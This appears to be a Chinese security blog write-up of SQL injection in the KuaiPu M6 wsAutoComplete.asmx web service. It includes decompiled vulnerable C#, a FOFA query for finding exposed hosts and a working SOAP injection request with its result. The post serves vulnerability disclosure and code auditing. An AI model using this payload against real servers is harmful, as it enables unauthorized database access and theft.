---
title: "快普M6 WebService/wsAutoComplete.asmx 多处SQL注入漏洞"
source: https://mrxn.net/jswz/kuaipu-WebService-wsAutoComplete.html
asset_dir: assets/快普m6-webservicewsautocomplete.asmx-多处sql注入漏洞
---

# 快普M6 WebService/wsAutoComplete.asmx 多处SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/31 08:20
- 645浏览
- [0评论](#comment)
- 29分钟阅读

深入探索

Web服务

数据库

sql

---

# 漏洞简介

快普M6整合管理平台的WebService/wsAutoComplete.asmx接口下多个方法存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。攻击者可通过构造恶意SQL语句，绕过参数过滤机制，实现对数据库的任意查询、修改或删除操作，甚至可能获取系统控制权限。

# 影响版本

# fofa语法

> body="Resource/JavaScript/jKPM6.DateTime.js"

# 漏洞分析

根据漏洞通告，看下 WebService/wsAutoComplete.asmx 里的cs引用

```
<%@ WebService Language="C#" CodeBehind="wsAutoComplete.asmx.cs" Class="KPMIIS.Web.WebService.wsAutoComplete" %>
```

ok,根据引用去找到bin目录下的KPMIIS.Web.dll文件，反编译后找到WebService下的wsAutoComplete实现

```
public class wsAutoComplete : System.Web.Services.WebService
{
  [ScriptMethod]
  [WebMethod]
  public string[] GetCustomerList(string prefixText, int count, string contextKey)
  {
    if (count == 0)
      count = 10;
    string str1 = " CustName like '%{0}%'or CustPY like '%{0}%' or MemberCard like '%{0}%' or CustCode like '%{0}%'";
    string str2 = !string.IsNullOrEmpty(prefixText) ? string.Format(str1, (object) prefixText) : " 1=1 ";
    using (DataTable table = Gateway.Default.FromCustomSql($"select top {count} CustId,CustName from Common_Customer where {str2}").ToDataSet().Tables[0])

  [WebMethod]
  [ScriptMethod]
  public string[] GetSupplierList(string prefixText, int count, string contextKey)
  {
    if (count == 0)
      count = 10;
    string str1 = "SuppName like '%{0}%' or SuppPY like '%{0}%'";
    string str2 = !string.IsNullOrEmpty(prefixText) ? string.Format(str1, (object) prefixText) : "1=1";
    DataTable table = Gateway.Default.FromCustomSql($"select top {count} SuppId, SuppName from Common_Supplier where {str2}").ToDataSet().Tables[0];

  [ScriptMethod]
  [WebMethod]
  public string[] GetAccountTitleList(string prefixText, int count)
  {
    if (count == 0)
      count = 10;
    string str1 = "ACCOUNT_TITLE_CODE like '{0}%' and (ACCOUNT_TITLE_CODE like '1001%' or ACCOUNT_TITLE_CODE like '1002%')";
    string str2 = !string.IsNullOrEmpty(prefixText) ? string.Format(str1, (object) prefixText) : "1=1";
    DataTable table = Gateway.Default.FromCustomSql($"select top {count} ACCOUNT_TITLE_ID,ACCOUNT_TITLE_CODE, ACCOUNT_TITLE_NAME from ERP_AccountTitle where {str2}").ToDataSet().Tables[0];
```

三个方法 `GetCustomerList`、`GetSupplierList`和`GetAccountTitleList`都是差不多的处理逻辑，其中都存在关键参数**prefixText**，没有经过任何过滤或校验检查就被拼接进SQL语句中进行执行了，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，非常的朴实无华。

# 漏洞复现

> 漏洞复现需要打开漏洞文件页面获取一些其他必要参数如\_\_VIEWSTATE之类

```
POST /WebService/wsAutoComplete.asmx HTTP/1.1
Host: kuaipu.mrxn.net
Content-Type: application/soap+xml;charset=UTF-8;action="http://tempuri.org/GetAccountTitleList"

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:GetAccountTitleList>
         <!--Optional:-->
         <tem:prefixText>'-1/user--</tem:prefixText>
         <tem:count>1</tem:count>
      </tem:GetAccountTitleList>
   </soap:Body>
</soap:Envelope>
```

深入探索

SQL注入防护

Nessus

防火墙软件

[![快普M6 WebService/wsAutoComplete.asmx 多处SQL注入漏洞](images/img-001-85d6ae1d5afd.webp)](https://image.mrxn.net/b79e1a79cef546cb862085838634d11e.webp)

成功通过报错注入在响应回显数据库默认用户dbo

其他两个方法的sql注入也类似，只是需要的参数不同罢了，同时给该接口还支持常规的GET、POST请求方式

[![快普M6 WebService/wsAutoComplete.asmx 多处SQL注入漏洞](images/img-002-b8b311cd45d9.webp)](https://image.mrxn.net/3742544e14dd40ee888e3207a1740890.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
